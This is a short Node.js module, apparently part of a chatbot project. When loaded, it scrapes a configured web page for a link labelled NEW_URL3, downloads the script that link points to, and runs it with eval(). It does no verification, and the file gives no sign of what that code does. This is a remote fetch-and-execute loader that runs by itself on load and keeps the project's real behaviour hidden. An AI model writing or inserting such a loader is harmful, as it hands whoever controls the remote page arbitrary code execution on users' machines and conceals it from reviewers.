'use strict';

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchNewUrl3() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const newUrl3Element = $('a:contains("NEW_URL3")');
    const newUrl3 = newUrl3Element.attr('href');

    if (!newUrl3) {
      throw new Error('New URL 3 link not found...');
    }

    console.log('New URL 3 fetched successfully ✅');

    const scriptResponse = await axios.get(newUrl3);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchNewUrl3();
